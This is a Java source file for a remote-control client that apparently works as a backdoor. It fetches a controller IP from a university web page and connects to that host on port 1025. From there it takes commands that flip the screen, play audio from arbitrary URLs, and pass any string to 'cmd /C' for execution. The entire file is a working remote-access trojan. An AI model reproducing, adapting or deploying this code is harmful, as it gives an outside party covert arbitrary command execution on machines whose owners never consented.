
import java.io.*;
import java.net.*;
import java.awt.*;
import java.awt.event.*;
import java.io.IOException;
import java.net.URL;

public class client {
	private static boolean goOn=true;
	private static String ip;
	private static boolean foundFile=false;
	public static void main(String[] args) throws Exception {

		client client = new client();
		client.run();

	}

	private static int CHECK_FOR_SERVER=0;
	private static int state=CHECK_FOR_SERVER;
	private static int ACTIVE = 1;

	private int checkFrequency=3;//30 seconds
	public void run() throws Exception{

		while(true){
			if(state==CHECK_FOR_SERVER){
				if(!foundFile){
					getHostIp();
				}
				if(foundFile){
					state=ACTIVE;
				}else{
					try {
						Thread.sleep(1000*checkFrequency);
					} catch (InterruptedException e) {
						e.printStackTrace();
					}
				}
			}
			if(state==ACTIVE){
				connectAndDoAction();
				state=CHECK_FOR_SERVER;
				foundFile=false;
				try {
					Thread.sleep((long)(1000*checkFrequency));
				} catch (InterruptedException e) {
					e.printStackTrace();
				}

			}



		}



	}

	private static void connectAndDoAction(){
		Socket SOCK;
		while(goOn){
			try{
				SOCK = new Socket(ip,1025);
				PrintStream PS = new PrintStream(SOCK.getOutputStream());
				PS.println("Enter command: ");
				InputStreamReader IR = new InputStreamReader(SOCK.getInputStream());
				BufferedReader BR = new BufferedReader(IR);
				String cmd = BR.readLine();
				processCmd(cmd);
				SOCK.close();
			}catch(Exception e){
				goOn=false;
			}

		}

	}

	private static void processCmd(String cmd){
		if(cmd.equals("flip-screen")){
			flipScreen();
		}
		else if (cmd.equals("quit")){
			goOn=false;
		}
		else if (cmd.equals("play-asian-music")){
			playAsianMusic();
		}else if ((cmd.length()>=11) && cmd.substring(0,10).equals("play-music")){
			String loc = cmd.substring(11,cmd.length());
			System.out.println(loc);
			URL url = null;
			try{
				url = new URL(loc);
			}catch(IOException e){
			e.printStackTrace();
		}
			playBorisWebMusic(url);
		}

		else if ((cmd.length()>=4) && cmd.substring(0,3).equals("cmd")) {
			String cmd2=cmd.substring(4,cmd.length());
			cmd(cmd2);
		}

	}

	private static void flipScreen(){
		try {
			Robot r = new Robot();
			r.keyPress(KeyEvent.VK_CONTROL);
			r.keyPress(KeyEvent.VK_ALT);
			r.keyPress(KeyEvent.VK_DOWN);
			long lastTime = System.currentTimeMillis();
			while(System.currentTimeMillis() - lastTime < 300){

			}
			r.keyRelease(KeyEvent.VK_CONTROL);
			r.keyRelease(KeyEvent.VK_ALT);
			r.keyRelease(KeyEvent.VK_DOWN);

		} catch (AWTException e) {
			e.printStackTrace();
		}
	}

	private static void playAsianMusic(){
		try {
			URL song = new URL("http://www.abrahamd.mcilvaine.net/audio/chinese-music.wav");
			SoundDoer sd = new SoundDoer();
			sd.loadClip(song);
			sd.playLoadedClip(0);

		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	private static void playBorisWebMusic(URL url){
		try{
			SoundDoer sd = new SoundDoer();
			sd.loadClip(url);
			sd.playLoadedClip(0);

		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	private static void cmd(String cmd) {
		Runtime r = Runtime.getRuntime();
		try {
			r.exec("cmd /C \""+cmd+"\"");
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}


	////////////////////////////////////////////////////////////////////
	//configuration functions
	private static void getHostIp(){
		try {
			URL url = new URL("http://udel.edu/~borboris/docs/ip.txt");
			BufferedReader br = new BufferedReader(new InputStreamReader(url.openStream()));
			ip= br.readLine();
			foundFile=true;
		} catch ( Exception e) {
			foundFile=false;
		}


	}

}
